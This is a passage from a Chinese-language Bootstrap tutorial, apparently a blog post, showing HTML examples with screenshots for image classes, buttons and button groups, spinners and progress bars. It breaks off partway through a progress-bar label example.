<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./1.png"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"img-thumbnail"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"300"</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f4ebb4707334c778e3c9aed4f1877b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=gCODz4XbCL%2F3rDvgk9%2FxuA1I%2Fug%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-67">对齐图像</h3>
<p>我们可以使用<code>.float-start</code>或<code>.float-end</code>将图片实现向左或向右移动。</p>
<h3 data-id="heading-68">图像居中</h3>
<p>如果想将图片居中我们可以使用<code>.mx-auto</code>和<code>.d-block</code>类来设置图片居中对齐：</p>
<pre><code class="hljs language-html" lang="html"> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./1.png"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"img-thumbnail mx-auto d-block"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"300"</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/196f43d0b34c4c99b71e90ace18243ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=iqEe0higg6WXeOxSZzh8nvTp5w4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-69">响应式图片</h3>
<p>图片有各种各样的尺寸，我们又是需要根据屏幕大小来调整图片，我们可以通过在<code>&lt;img&gt;</code>标签中添加<code>.img-fluid</code>类来设置响应式图片。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./1.png"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"img-thumbnail img-fluid"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"899"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"900"</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98711904a2034c64b6c64fb72771c312~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=ikeOYvJWIFzibOnZcZQL2b9T7W8%3D" alt="" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9102b72b88ae4560be42c043b0a942cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=PDDuUJXjieeeZwUgefJDrcwkSIM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-70">Bootstap 按钮</h2>
<h3 data-id="heading-71">基础按钮</h3>
<p>Bootstrap 按钮内置了几种预定义的按钮样式，并添加了额外的一些按钮，然后带有<code>.btn</code>的元素都会基础圆角按钮的默认外观。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span>&gt;</span>基本按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-secondary"</span>&gt;</span>次要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-success"</span>&gt;</span>成功<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-info"</span>&gt;</span>信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-warning"</span>&gt;</span>警告<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-danger"</span>&gt;</span>危险<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-dark"</span>&gt;</span>黑色<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-light"</span>&gt;</span>浅色<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-link"</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c62ac69b1a3846a9b4bdec421b412d05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=r%2BBviV6XT5nm%2FEEgZJ5Tw%2BFNGbA%3D" alt="" loading="lazy"/></p>
<p>按钮类可用于 <code>a</code>、<code>button</code>或<code>input</code>标签元素上：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-success"</span>&gt;</span>链接按钮<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-success"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"输入按钮"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span>&gt;</span>基本按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01933c478d614211a58fcce87cbfcb15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=67gCq5Q%2FZ0kiXeTZgcN50rYAxt4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-72">按钮边框</h3>
<p>Bootstrap 还提供了八个边框按钮，鼠标移动到按钮上突出显示：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-secondary"</span>&gt;</span>次要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-success"</span>&gt;</span>成功<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-info"</span>&gt;</span>信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-warning"</span>&gt;</span>警告<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-danger"</span>&gt;</span>危险<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-dark"</span>&gt;</span>黑色<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-light"</span>&gt;</span>浅色<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-link"</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b3294aff0ef418299cf287e2f9847c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=%2BTnhwmdowyRXefCIgaAghmOezvU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-73">按钮尺寸</h3>
<p>我们可以通过<code>.btn-lg</code>和<code>.btn-small</code>类来分别设置大按钮和小按钮</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-lg btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-sm btn-outline-secondary"</span>&gt;</span>次要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d75128cdda494eb6b1ddebba36997e90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=9QWBN3wsAtoE5S%2Fdc%2BODDZj0RbE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-74">块级按钮</h3>
<p>如果需要跨越父元素整个宽度的块级按钮，通过添加<code>.btn-block</code>类可以设置块级按钮，<code>.d-grid</code>类设置在父元素中：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"d-grid"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-block btn-outline-success"</span>&gt;</span>成功<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14cf3f173a5f46d98be040d40733b2ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=D6dOWBnxRIh2LauFj5GVToHZ7q4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-75">按钮活动/禁止</h3>
<p>我们可以通过<code>.actiove</code>类和 <code>disabled</code>属性来控制按钮是不是可以点击的。(注：<code>a</code>标签不支持<code>disabled</code>属性，我们可以通过<code>.disabled</code>类来进行禁止链接点击)</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-success disabled"</span>&gt;</span>链接按钮<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-success"</span> <span class="hljs-attr">disabled</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"输入按钮"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-success"</span> <span class="hljs-attr">disabled</span>&gt;</span>成功<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2983f2b4ce7745adb99cadb1b6f37fba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=pH%2F85q97ymf3n9c5KdYnRXyF%2BIY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-76">按钮组</h3>
<h4 data-id="heading-77">基本按钮组</h4>
<p>创建一个按钮组，我们只需要将具有<code>.btn</code>按钮包装在<code>div</code>标签元素中，然后在其上应用<code>.btn-group</code>类，还可以在单个按钮上应用<code>.active</code>类来表明活跃状态。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn-group"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary active"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ab094d57b704ca2bd060aed4d03ccc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=73PAItCelyhuywYyYQ8tPIisP7o%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-78">按钮组的大小</h4>
<p>我们可以通过<code>.btn-group-lg | sm | xs</code>来设置按钮的大小，是都整个按钮组的大小调整。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn-group-lg"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary active"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c914e38206154f64a98439bb1d5853c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=x366tOCPioKycotZkw58HkRBy1w%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-79">垂直按钮组</h4>
<p>我们只需要将<code>.btn-group</code>替换为<code>.btn-group-certical</code>就可以得到一个垂直按钮组。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn-group-vertical"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary active"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-outline-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d2484ab7834490a84df04a36f32c38e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=YA3a17T56eiHP%2BO6l5vLUTDETb4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-80">Bootstrap 加载器</h2>
<h3 data-id="heading-81">基础加载器</h3>
<p>加载器就是我们在获取一个元素使等待响应的一个加载动画，我们可以使用<code>.spinner-border</code>类来创建一个加载器，我们还可以根据文本颜色类来设置不同的颜色：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-border"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-border text-warning"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7924734205e24b66a4973de842dd94a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=PyFKmpeyN7Q8y5KO2YU1M%2B3gztc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-82">闪烁加载效果</h3>
<p>我们可以通过<code>.spinner-grow</code>类来设置闪烁加载效果：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-grow"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-border"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-border text-warning"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec1717b91b8244789f9983c309a6da70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=E4z8HC2M44QKAs21ZLpZV9vayv8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-83">设置加载效果大小</h3>
<p>我们可以通过<code>.spinner-border-sm</code>或<code>.spinner-grow-sm</code>来改变加载效果的大小：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-grow spinner-grow-sm"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-border spinner-border-sm"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cfef0f73d5a4a2cb72913ed0a185c96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=wFiwa9D3z0PX%2FlP8hWvNpQLJWxE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-84">加载按钮</h3>
<p>我们还可以在按钮中创建加载效果：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"spinner-border"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    加载中..
<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/352b15f08765418499e0f4395cc96835~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=VGdesH7mv8%2Fx1cB6YtO2hWCMdyg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-85">Bootstrap 进度条</h2>
<h3 data-id="heading-86">基础进度条</h3>
<p>我们在使用Bootstrap 进度条时我们需要知，Bootstrap进度条分为两层，一层是外部元素使用<code>.progress</code>，用于显示进度条的最大值，一层是内部元素使用<code>.progress-bar</code>，用于指示目前为止的进度。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:50%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb17d92de3344af9a05dda460f647600~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=EROruSA%2Bo2y349FmQe64Emcg8zw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-87">进度条高度</h3>
<p>我们可以通过给外层<code>.progress</code>来指定其高度高度，默认高度为1rem。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 1.5rem;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:50%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff25c4f5613f4fb98d7247ded85e4bff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=uEjLInMQ8ZGfuqk5U7kbqEXK0e8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-88">进度条标签</h3>
<p>我们可以在<code>.progress-bar</code>元素内添加文本，以显示可见的百分比。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 1.5rem;"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:50%"</span>&gt;</span>
        50%
